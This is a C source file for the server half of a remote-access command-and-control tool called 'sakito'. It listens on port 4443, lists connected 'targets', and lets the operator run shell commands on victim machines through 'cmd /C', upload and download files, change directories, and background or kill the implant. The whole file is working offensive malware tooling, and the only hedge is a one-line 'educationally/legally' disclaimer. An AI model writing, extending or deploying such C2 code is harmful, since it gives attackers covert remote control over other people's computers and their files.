/*
Coded by d4rkstat1c.
Use this code educationally/legally.
*/

#include "headers/os_check.h"
#define SERVER

#ifdef OS_WIN
	#include <WS2tcpip.h>
	#include <Windows.h>
	#include <inttypes.h>
	#include "headers/sakito_core.h"
	#include "headers/sakito_swin_utils.h"
	#pragma comment(lib, "ws2_32.lib")
#elif defined OS_LIN
	#define _LARGEFILE64_SOURCE
	#include <string.h>
	#include <arpa/inet.h>
	#include "headers/nbo_encoding.h"
	#include "headers/sakito_core.h"
	#include "headers/sakito_slin_utils.h"
#endif

/*
All sak1to-API functions that are prefixed with "s_" are located within sakito_server_tools.h-
and depending on the OS sakito_s*_tools.h. All functions that are not prefixed with "s_" are-
local to this (sakito_server.c) file and the Standard GNU C Library.
*/
#include <stdio.h>
#include <errno.h>
#include "headers/sakito_server_tools.h"

#define PORT 4443

// Function to bind socket to specified port.
void bind_socket(const SOCKET listen_socket) 
{
	// Create sockaddr_in structure.
	struct sockaddr_in sin;

	// Assign member values.
	sin.sin_family = AF_INET;
	sin.sin_port = htons(PORT);
	sin.sin_addr.s_addr = htonl(INADDR_ANY);

	// Bind ip address and port to listen_socket.
	if (bind(listen_socket, (struct sockaddr*)&sin, sizeof(sin)) != 0)
		terminate_server(listen_socket, "Socket bind failed with error");

	// Place the listen_socket in listen state.
	if (listen(listen_socket, SOMAXCONN) != 0)
		terminate_server(listen_socket, "An error occured while placing the socket in listening state");
}

// Host change directory function.
void host_chdir(Server_map* const s_map) 
{
	if (chdir(s_map->buf+3) == FAILURE) 
		if (errno) 
			fprintf(stderr, "%s: %s\n\n", s_map->buf+3, strerror(errno));
}

// Function to list/print all available connections to stdout.
void list_connections(Server_map* const s_map) 
{
	printf("\n---------------------------\n");
	printf("---  C0NNECTED SYSTEMS  ---\n");
	printf("--     Hostname: ID      --\n");
	printf("---------------------------\n\n");

	if (s_map->clients_sz) 
	{
		for (size_t i = 0; i < s_map->clients_sz; i++)
			printf("%s: %lu\n", s_map->clients[i].host, i);
		fputc('\n', stdout);
	}
	else 
	{
		printf("No connected targets available.\n\n\n");
	}
}

// Function send change directory command to client and handle client-side errors.
int client_chdir(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
{
	// '1' is the command code for changing directory.
	buf[3] = '1';
	
	// Send command code + directory string to be parsed.
	if (s_tcp_send(client_socket, buf+3, BUFLEN) < 1)
		return FAILURE;

	// Receive _chdir() result.
	if (s_tcp_recv(client_socket, buf, 1) < 1)
		return FAILURE;

	if (buf[0] == '0')
		puts("The client's system cannot find the path specified.\n");
 
	return SUCCESS;
}

// Function to terminate/kill client.
int terminate_client(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
{
	// '2' is the command code for terminating/killing the process on the client.
	s_tcp_send(client_socket, "2", cmd_len);

	return EXIT_SUCCESS;
}

// Function to receive file from target machine (TCP file transfer).
int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
{
	// '4' is the command code for downloading a file from the client's file-system.
	buf[9] = '4';

	// Send command code + filename to be parsed.
	if (s_tcp_send(client_socket, buf+9, cmd_len) < 1)
		return SOCKET_ERROR;
 
	// Receive serialized file size uint64_t bytes.
	if (s_tcp_recv(client_socket, buf, sizeof(uint64_t)) < 1)
		return SOCKET_ERROR;
 
	// Deserialize file size bytes.
	uint64_t f_size = s_ntohll_conv(buf);

	// Initialize i_result to true/1
	int i_result;

	// If f_size == -1 the file doesn't exist (client-side).
	if ((long)f_size != FAILURE)
	{
		// Open the file.
		s_file file = s_open_file(buf+10, WRITE);
		if (file == INVALID_FILE)
			return FAILURE;

		// If the file contains data.
		if (f_size > 0)
			// Receive the file's data.
			i_result = s_recv_file(client_socket, file, buf, f_size);
		
		// Close the file.
		s_close_file(file);
	}
	else 
	{
		puts("The client's system cannot find the file specified.\n");
	}
 
	// Send byte indicating file transfer has finished to prevent overlapping received data.
	if (s_tcp_send(client_socket, FTRANSFER_FINISHED, 1) < 1)
		return SOCKET_ERROR;

	return i_result;
}

// Function to upload file to target machine (TCP file transfer).
int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
{
	// Open file.
	s_file file = s_open_file(buf+8, READ);
 
	// If the file doesn't exist or permission denied:
	if (file == INVALID_FILE) 
	{
		fprintf(stderr, "upload: cannot access: '%s': %s\n\n", buf+8, strerror(errno));

		// Send SERVER_ERROR/'6' control code to client to force client to re-receive command.
		if (s_tcp_send(client_socket, "6", 1) < 1)
			return SOCKET_ERROR;

		return FILE_NOT_FOUND;
	}

	// '3' is the command code for uploading a file to the client's file-system.
	buf[7] = '3';

	// Send command code + filename to be parsed.
	if (s_tcp_send(client_socket, buf+7, cmd_len) < 1)
		return SOCKET_ERROR;

	// Receive file transfer start byte to prevent received data from overlapping.
	if (s_tcp_recv(client_socket, buf, 1) < 1)
		return SOCKET_ERROR;
 
 	// Get size of file.
 	uint64_t f_size = s_file_size(file);

 	// Send file to client/upload file.
	int i_result = s_send_file(client_socket, file, buf, f_size);

	// Close the file.
	s_close_file(file);

	return i_result;
}

// Function to terminate/kill client.
int background_client(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
{
	// '5' is the command code for backgrounding the client.
	if (s_tcp_send(client_socket, "5", 1) < 1)
		return SOCKET_ERROR;

	return BACKGROUND;
}

// Function to send command to client to be executed via CreateProcess() and receive output.
int client_exec(char* buf, const size_t cmd_len, const SOCKET client_socket) 
{
	buf -= 7;
	memcpy(buf, "0cmd /C ", 8); // 0 is the command code for executing the command via CreateProcess on the client.

	// Send command to server.
	if (s_tcp_send(client_socket, buf, cmd_len+8) < 1)
		return SOCKET_ERROR;

	// Clear the buffer.
	memset(buf, '\0', BUFLEN);

	// Receive command output stream and write output chunks to stdout.
	while (1)
	{
		// Receive initial uint32_t chunk size.
		if (s_tcp_recv(client_socket, buf, sizeof(uint32_t)) != sizeof(uint32_t))
			return FAILURE;

		// Deserialize chunk size uint32_t bytes.
		int64_t chunk_size = (int64_t)s_ntohl_conv(buf);

		// Security chunk size range check.
		if ((chunk_size < 0) || (chunk_size > BUFLEN))
			return FAILURE;
		// End of cmd.exe output.
		else if (chunk_size == 0)
			break;

		int bytes_received, count = 0;

		// Continue to receive cmd shell output.
		do {
			if ((bytes_received = s_tcp_recv(client_socket, buf+count, chunk_size)) < 1)
				return SOCKET_ERROR;

			// Write chunk bytes to stdout.
			if (s_write_stdout(buf+count, chunk_size) == FAILURE)
			{
				fprintf(stderr, "Error calling write_stdout() in client_exec() function: %s\n\n", strerror(errno));
				return FAILURE;
			}

			// Counter for offset.
			count += bytes_received;

		// If we still have data/output left within the current chunk.
		} while ((chunk_size -= bytes_received) > 0);
	}

	// Write newline to stdout for cmd line output alignment.
	fputc('\n', stdout);

	return SUCCESS;
}

void resize_conns(Server_map* const s_map, int client_id) 
{
	// If there's more than one connection: resize the clients structure member values.
	if (s_map->clients_sz > 1) 
	{
		int max_index = s_map->clients_sz-1;
		for (size_t i = client_id; i < max_index; i++) 
		{
			s_map->clients[i].sock = s_map->clients[i + 1].sock;
			s_map->clients[i].host = s_map->clients[i + 1].host;
		}
		s_map->clients[max_index].sock = 0;
		s_map->clients[max_index].host = NULL;
	}

	s_map->clients_sz--;
}

// Function to resize s_map array/remove and close connection.
void delete_client(Server_map* const s_map, const int client_id) 
{
	// Lock our mutex to prevent race conditions from occurring with accept_conns().
	s_mutex_lock(s_map);

	// If the file descriptor is open: close it.
	if (s_map->clients[client_id].sock)
		s_closesocket(s_map->clients[client_id].sock);

	// Resize clients member values to remove client.
	resize_conns(s_map, client_id);

	// Unlock our mutex to now.
	s_mutex_unlock(s_map);
	printf("Client: \"%s\" disconnected.\n\n", s_map->clients[client_id].host);
}

// Function to parse interactive input and send to specified client.
void client_interact(Server_map* const s_map) 
{
	// validate client-id for interaction.
	int client_id = s_validate_id(s_map);

	// Validation condition located in s_server_tools.h.
	if (client_id == INVALID_CLIENT_ID) 
	{
		puts("Invalid client identifier.");
		return;
	}

	// Send initialization byte to client.
	int i_result = s_tcp_send(s_map->clients[client_id].sock, INIT_CONN, 1);

	// Receive and parse input/send commands to client.
	while (i_result > 0) 
	{
		// Receive current working directory.
		if (s_tcp_recv(s_map->clients[client_id].sock, s_map->buf, BUFLEN) < 1)
			break;

		printf(INTERACT_FSTR, client_id, s_map->clients[client_id].host, s_map->buf);

		// Set all bytes in buffer to zero.
		memset(s_map->buf, '\0', BUFLEN);

		// Array of command strings to parse stdin with.
		const char commands[5][11] = { "cd ", "exit", "upload ", "download ", "background" };

		// Function pointer array of each c2 command.
		void* func_array[5] = { &client_chdir, &terminate_client, &send_file, &recv_file, &background_client };

		// Parse stdin string to return c2 command function pointer.
		size_t cmd_len = 0;
		const server_func target_func = (const server_func)s_parse_cmd(s_map->buf+8,
									&cmd_len,
									5,
									commands,
									func_array,
									&client_exec);

		// Call target function.
		i_result = target_func(s_map->buf+7, cmd_len+1, s_map->clients[client_id].sock);

		// If return value is background, return and don't disconnect.
		if (i_result == BACKGROUND)
			return;
	}

	// If client disconnected/exit command is parsed: delete the connection.
	delete_client(s_map, client_id);
}

void sakito_console(Server_map* const s_map) 
{
	// Saktio console loop.
	while (1) 
	{
		get_cwd(s_map->buf);
		printf(CONSOLE_FSTR, s_map->buf);

		// Set all bytes in buffer to zero.
		memset(s_map->buf, '\0', BUFLEN);

		// Array of command strings to parse stdin with.
		const char commands[4][11] = { "cd ", "exit", "list", "interact " };

		// Function pointer array of each c2 command.
		void* func_array[4] = { &host_chdir, &s_terminate_console, &list_connections, &client_interact };

		// Parse stdin string to return console command function pointer.
		size_t cmd_len = 0;
		const console_func target_func = (const console_func)s_parse_cmd(s_map->buf,
									 &cmd_len,
									 4,
									 commands,
									 func_array,
									 &s_exec_cmd);

		// Call target function.
		target_func(s_map);
	}
}


// Main function for parsing console input and calling sakito-console functions.
int main(void) 
{
	// Instantiate a Server_map structure.
	Server_map s_map;

	// Initialize the server (Accept connections).
	s_init(&s_map);

	// Initiate sakito console.
	sakito_console(&s_map);

	return EXIT_FAILURE;
}
